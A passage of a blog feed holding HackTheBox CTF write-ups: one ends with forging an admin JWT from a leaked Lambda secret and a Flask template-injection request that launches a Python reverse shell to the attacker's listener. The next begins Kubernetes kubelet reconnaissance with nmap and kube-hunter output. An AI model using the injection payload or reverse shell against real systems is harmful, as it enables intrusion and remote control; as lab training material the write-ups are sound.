+            <span style="color:#e6db74">&#34;PackageType&#34;</span>: <span style="color:#e6db74">&#34;Zip&#34;</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">]</span>
+<span style="color:#f92672">}</span>
+
+aws --endpoint-url<span style="color:#f92672">=</span>http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
+
+<span style="color:#f92672">}</span>,
+    <span style="color:#e6db74">&#34;Code&#34;</span>: <span style="color:#f92672">{</span>
+        <span style="color:#e6db74">&#34;Location&#34;</span>: <span style="color:#e6db74">&#34;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&#34;</span>
+    <span style="color:#f92672">}</span>,
+    <span style="color:#e6db74">&#34;Tags&#34;</span>: <span style="color:#f92672">{}</span>
+
+</code></pre></div><p>Visit url and get the function</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
+
+secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span> <span style="color:#75715e">#apigateway authorization for CR-124</span>
+
+<span style="color:#e6db74">&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lambda_handler</span>(event, context):
+    <span style="color:#66d9ef">try</span>:
+        id<span style="color:#f92672">=</span>event[<span style="color:#e6db74">&#39;queryStringParameters&#39;</span>][<span style="color:#e6db74">&#39;order_id&#39;</span>]
+        <span style="color:#66d9ef">if</span> id:
+            <span style="color:#66d9ef">return</span> {
+               <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">200</span>,
+               <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(str(resp)) <span style="color:#75715e">#dynamodb tracking for CR-342</span>
+            }
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> {
+                <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">500</span>,
+                <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(<span style="color:#e6db74">&#39;Invalid Order ID&#39;</span>)
+            }
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> {
+                <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">500</span>,
+                <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(<span style="color:#e6db74">&#39;Invalid Order ID&#39;</span>)
+            }
+
+</code></pre></div><p>we can use this secret to login admin in app port 5000. Craft jwt in <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a> with private key and get authorization.</p>
+<p><img src="/img/htb_epsilon_jwt.png" alt=""></p>
+<p>Get admin page</p>
+<p><img src="/img/htb_epsilon_admin.png" alt=""></p>
+<p>In Order page, input costume is reflected, because this web using flask, i suspect we can SSTI from that.</p>
+<p><img src="/img/htb_epsilon_order1.png" alt=""></p>
+<p><img src="/img/htb_epsilon_order2.png" alt=""></p>
+<p>Get RCE :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">POST <span style="color:#f92672">/</span>order<span style="color:#960050;background-color:#1e0010">?</span>input<span style="color:#f92672">=</span>python3<span style="color:#f92672">+-</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;import+socket,subprocess,os%3bs</span><span style="color:#e6db74">%3d</span><span style="color:#e6db74">socket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&#34;10.10.14.3&#34;,9000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(&#34;sh&#34;)&#39;</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host: <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
+Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">220</span>
+Cache<span style="color:#f92672">-</span>Control: max<span style="color:#f92672">-</span>age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+Upgrade<span style="color:#f92672">-</span>Insecure<span style="color:#f92672">-</span>Requests: <span style="color:#ae81ff">1</span>
+Origin: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
+Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>x<span style="color:#f92672">-</span>www<span style="color:#f92672">-</span>form<span style="color:#f92672">-</span>urlencoded
+User<span style="color:#f92672">-</span>Agent: Mozilla<span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (X11; Linux x86_64) AppleWebKit<span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (KHTML, like Gecko) Chrome<span style="color:#f92672">/</span><span style="color:#ae81ff">96.0.4664.45</span> Safari<span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
+Accept: text<span style="color:#f92672">/</span>html,application<span style="color:#f92672">/</span>xhtml<span style="color:#f92672">+</span>xml,application<span style="color:#f92672">/</span>xml;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,image<span style="color:#f92672">/</span>avif,image<span style="color:#f92672">/</span>webp,image<span style="color:#f92672">/</span>apng,<span style="color:#f92672">*/*</span>;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span>,application<span style="color:#f92672">/</span>signed<span style="color:#f92672">-</span>exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
+Referer: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>order
+Accept<span style="color:#f92672">-</span>Encoding: gzip, deflate
+Cookie: auth<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span style="color:#f92672">.</span>eyJ1c2VybmFtZSI6ImFkbWluIn0<span style="color:#f92672">.</span>WFYEm2<span style="color:#f92672">-</span>bZZxe2qpoAtRPBaoNekx<span style="color:#f92672">-</span>oOwueA80zzb3Rc4
+Accept<span style="color:#f92672">-</span>Language: en<span style="color:#f92672">-</span>US,en;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,id;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span>,ms;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.7</span>
+Connection: close
+
+costume<span style="color:#f92672">=</span>{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span><span style="color:#66d9ef">for</span><span style="color:#f92672">+</span>x<span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span>}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;warning&#34;</span><span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>x<span style="color:#f92672">.</span>__name__<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>input)<span style="color:#f92672">.</span>read()}}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>endif<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>endfor<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>}<span style="color:#f92672">&amp;</span>q<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span>addr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+
+nc <span style="color:#f92672">-</span>lnvp <span style="color:#ae81ff">9000</span>
+Listening on <span style="color:#ae81ff">0.0.0.0</span> <span style="color:#ae81ff">9000</span>
+Connection received on <span style="color:#ae81ff">10.129.96.99</span> <span style="color:#ae81ff">38578</span>
+<span style="color:#960050;background-color:#1e0010">$</span> ls
+ls
+app<span style="color:#f92672">.</span>py  static  templates
+<span style="color:#960050;background-color:#1e0010">$</span> cd <span style="color:#f92672">..</span>
+cd <span style="color:#f92672">..</span>
+l<span style="color:#960050;background-color:#1e0010">$</span> s
+ls
+app  flag<span style="color:#f92672">.</span>txt  html
+<span style="color:#960050;background-color:#1e0010">$</span> cat flag<span style="color:#f92672">.</span>txt
+cat flag<span style="color:#f92672">.</span>txt
+HTB{l4mbd4_l34ks_4r3_fun<span style="color:#960050;background-color:#1e0010">!!!</span>}<span style="color:#960050;background-color:#1e0010">$</span>
+
+
+</code></pre></div><p>FLAG : <code>HTB{l4mbd4_l34ks_4r3_fun!!!}</code></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB UNI CTF - Cloud - SteamCloud Writeup</title>
+            <link>/posts/htb-uni-ctf-steamcloud-writeup/</link>
+            <pubDate>Wed, 24 Nov 2021 13:46:24 +0700</pubDate>
+            
+            <guid>/posts/htb-uni-ctf-steamcloud-writeup/</guid>
+            <description>Intro We&amp;rsquo;ve installed our Kubernetes cluster inside a steam powered computer, however there&amp;rsquo;s a lot of smoke, therefore we think a bolt is missing. Could you please investigate?
+TLDR  Exposed and Unrestricted Kubelet RCE in POD nginx namespace default Get Service Account nginx Access Cluster using Service Account Spawn privileged pod/Mounting host on pod PWNED  Recon Nmap using nmap try to scan open port.
+Open 10.129.96.107:22 Open 10.129.96.107:2379 Open 10.</description>
+            <content type="html"><![CDATA[<h1 id="intro">Intro</h1>
+<p>We&rsquo;ve installed our Kubernetes cluster inside a steam powered computer, however there&rsquo;s a lot of smoke, therefore we think a bolt is missing. Could you please investigate?</p>
+<h1 id="tldr">TLDR</h1>
+<ul>
+<li>Exposed and Unrestricted Kubelet</li>
+<li>RCE in POD nginx namespace default</li>
+<li>Get Service Account nginx</li>
+<li>Access Cluster using Service Account</li>
+<li>Spawn privileged pod/Mounting host on pod</li>
+<li>PWNED</li>
+</ul>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<p>using nmap try to scan  open port.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">22</span>
+Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2379</span>
+Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2380</span>
+Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">8443</span>
+Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10249</span>
+Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10256</span>
+
+
+PORT      STATE SERVICE          REASON  VERSION
+<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp    open  ssh              syn<span style="color:#f92672">-</span>ack OpenSSH <span style="color:#ae81ff">7.9</span>p1 Debian <span style="color:#ae81ff">10</span><span style="color:#f92672">+</span>deb10u2 (protocol <span style="color:#ae81ff">2.0</span>)
+<span style="color:#ae81ff">2379</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>etcd<span style="color:#f92672">-</span>client<span style="color:#960050;background-color:#1e0010">?</span> syn<span style="color:#f92672">-</span>ack
+<span style="color:#ae81ff">2380</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>etcd<span style="color:#f92672">-</span>server<span style="color:#960050;background-color:#1e0010">?</span> syn<span style="color:#f92672">-</span>ack
+<span style="color:#ae81ff">8443</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>https<span style="color:#f92672">-</span>alt    syn<span style="color:#f92672">-</span>ack
+<span style="color:#f92672">|</span> fingerprint<span style="color:#f92672">-</span>strings:
+<span style="color:#f92672">|</span>   FourOhFourRequest:
+<span style="color:#f92672">|</span>     HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">403</span> Forbidden
+<span style="color:#f92672">|</span>     Audit<span style="color:#f92672">-</span>Id: <span style="color:#ae81ff">925790</span>b4<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>d9b<span style="color:#f92672">-</span><span style="color:#ae81ff">418</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>cf1<span style="color:#f92672">-</span>d3b374c94699
+<span style="color:#f92672">|</span>     Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache, private
+<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>json
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Flowschema<span style="color:#f92672">-</span>Uid: <span style="color:#ae81ff">49</span>cc0b4a<span style="color:#f92672">-</span><span style="color:#ae81ff">2076</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45e5</span><span style="color:#f92672">-</span>aa89<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c27ad51f52c
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Prioritylevel<span style="color:#f92672">-</span>Uid: eda95003<span style="color:#f92672">-</span>d6be<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span>f3<span style="color:#f92672">-</span><span style="color:#ae81ff">8845</span><span style="color:#f92672">-</span>f63b66cbf0d3
+<span style="color:#f92672">|</span>     Date: Wed, <span style="color:#ae81ff">24</span> Nov <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">39</span> GMT
+<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">212</span>
+<span style="color:#f92672">|</span>     {<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:{},<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span><span style="color:#f92672">/</span>nice ports,<span style="color:#f92672">/</span>Trinity<span style="color:#f92672">.</span>txt<span style="color:#f92672">.</span>bak<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:{},<span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#ae81ff">403</span>}
+<span style="color:#f92672">|</span>   GetRequest:
+<span style="color:#f92672">|</span>     HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">403</span> Forbidden
+<span style="color:#f92672">|</span>     Audit<span style="color:#f92672">-</span>Id: <span style="color:#ae81ff">029</span>b8f8e<span style="color:#f92672">-</span>f971<span style="color:#f92672">-</span><span style="color:#ae81ff">49</span>d2<span style="color:#f92672">-</span>a1b2<span style="color:#f92672">-</span>d07eeee0ad73
+<span style="color:#f92672">|</span>     Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache, private
+<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>json
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Flowschema<span style="color:#f92672">-</span>Uid: <span style="color:#ae81ff">49</span>cc0b4a<span style="color:#f92672">-</span><span style="color:#ae81ff">2076</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45e5</span><span style="color:#f92672">-</span>aa89<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c27ad51f52c
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Prioritylevel<span style="color:#f92672">-</span>Uid: eda95003<span style="color:#f92672">-</span>d6be<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span>f3<span style="color:#f92672">-</span><span style="color:#ae81ff">8845</span><span style="color:#f92672">-</span>f63b66cbf0d3
+<span style="color:#f92672">|</span>     Date: Wed, <span style="color:#ae81ff">24</span> Nov <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">37</span> GMT
+<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">185</span>
+<span style="color:#f92672">|</span>     {<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:{},<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:{},<span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#ae81ff">403</span>}
+<span style="color:#f92672">|</span>   HTTPOptions:
+<span style="color:#f92672">|</span>     HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">403</span> Forbidden
+<span style="color:#f92672">|</span>     Audit<span style="color:#f92672">-</span>Id: <span style="color:#ae81ff">7</span>f890985<span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>b0f<span style="color:#f92672">-</span><span style="color:#ae81ff">4957</span><span style="color:#f92672">-</span>a0bc<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>b82b652ab08
+<span style="color:#f92672">|</span>     Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache, private
+<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>json
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Flowschema<span style="color:#f92672">-</span>Uid: <span style="color:#ae81ff">49</span>cc0b4a<span style="color:#f92672">-</span><span style="color:#ae81ff">2076</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45e5</span><span style="color:#f92672">-</span>aa89<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c27ad51f52c
+<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Prioritylevel<span style="color:#f92672">-</span>Uid: eda95003<span style="color:#f92672">-</span>d6be<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span>f3<span style="color:#f92672">-</span><span style="color:#ae81ff">8845</span><span style="color:#f92672">-</span>f63b66cbf0d3
+<span style="color:#f92672">|</span>     Date: Wed, <span style="color:#ae81ff">24</span> Nov <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">38</span> GMT
+<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">189</span>
+<span style="color:#f92672">|</span>_    {<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:{},<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot options path &#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:{},<span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#ae81ff">403</span>}
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (application/json).</span>
+<span style="color:#f92672">|</span> Issuer: commonName<span style="color:#f92672">=</span>minikubeCA
+<span style="color:#ae81ff">10249</span><span style="color:#f92672">/</span>tcp open  http             syn<span style="color:#f92672">-</span>ack Golang net<span style="color:#f92672">/</span>http server (Go<span style="color:#f92672">-</span>IPFS json<span style="color:#f92672">-</span>rpc <span style="color:#f92672">or</span> InfluxDB API)
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).</span>
+<span style="color:#ae81ff">10250</span><span style="color:#f92672">/</span>tcp open  ssl<span style="color:#f92672">/</span>http         syn<span style="color:#f92672">-</span>ack Golang net<span style="color:#f92672">/</span>http server (Go<span style="color:#f92672">-</span>IPFS json<span style="color:#f92672">-</span>rpc <span style="color:#f92672">or</span> InfluxDB API)
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).</span>
+<span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span>cert: Subject: commonName<span style="color:#f92672">=</span>steamcloud<span style="color:#f92672">@</span><span style="color:#ae81ff">1637736258</span>
+<span style="color:#f92672">|</span> Subject Alternative Name: DNS:steamcloud
+<span style="color:#f92672">|</span> Issuer: commonName<span style="color:#f92672">=</span>steamcloud<span style="color:#f92672">-</span>ca<span style="color:#f92672">@</span><span style="color:#ae81ff">1637736257</span>
+<span style="color:#ae81ff">10256</span><span style="color:#f92672">/</span>tcp open  http             syn<span style="color:#f92672">-</span>ack Golang net<span style="color:#f92672">/</span>http server (Go<span style="color:#f92672">-</span>IPFS json<span style="color:#f92672">-</span>rpc <span style="color:#f92672">or</span> InfluxDB API)
+<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).</span>
+
+Service Info: OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
+
+</code></pre></div><p>Open port in machine look familiar, i suggest this minikube with using kubeapi in port 8443. Knowing this try to ensure by checking with kube-hunter.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Remotes (separated by a <span style="color:#e6db74">&#39;,&#39;</span>): <span style="color:#ae81ff">10.129.96.107</span>
+Started hunting
+Discovering Open Kubernetes Services
+Found open service <span style="color:#e6db74">&#34;Etcd&#34;</span> at <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2379</span>
+Found open service <span style="color:#e6db74">&#34;Kubelet API&#34;</span> at <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Anonymous Authentication&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Exposed Pods&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Cluster Health Disclosure&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Exposed Running Pods&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Exposed Kubelet Cmdline&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Exposed Container Logs&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Exposed Run Inside Container&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+Found vulnerability <span style="color:#e6db74">&#34;Exposed System Logs&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
+
+Nodes
+<span style="color:#f92672">+-------------+---------------+</span>
+<span style="color:#f92672">|</span> TYPE        <span style="color:#f92672">|</span> LOCATION      <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-------------+---------------+</span>
+<span style="color:#f92672">|</span> Node<span style="color:#f92672">/</span>Master <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span> <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-------------+---------------+</span>
+
+Detected Services
+<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
+<span style="color:#f92672">|</span> SERVICE     <span style="color:#f92672">|</span> LOCATION            <span style="color:#f92672">|</span> DESCRIPTION          <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
+<span style="color:#f92672">|</span> Kubelet API <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> The Kubelet <span style="color:#f92672">is</span> the   <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> main component <span style="color:#f92672">in</span>    <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> every Node, all pod  <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> operations goes      <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> through the kubelet  <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
+<span style="color:#f92672">|</span> Etcd        <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2379</span>  <span style="color:#f92672">|</span> Etcd <span style="color:#f92672">is</span> a DB that    <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> stores cluster<span style="color:#e6db74">&#39;s     |</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> data, it contains    <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> configuration <span style="color:#f92672">and</span>    <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> current              <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>     state            <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> information, <span style="color:#f92672">and</span>     <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> might contain        <span style="color:#f92672">|</span>
+<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> secrets              <span style="color:#f92672">|</span>
+<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
+
+Vulnerabilities
+For further information about a vulnerability, search its ID <span style="color:#f92672">in</span>:
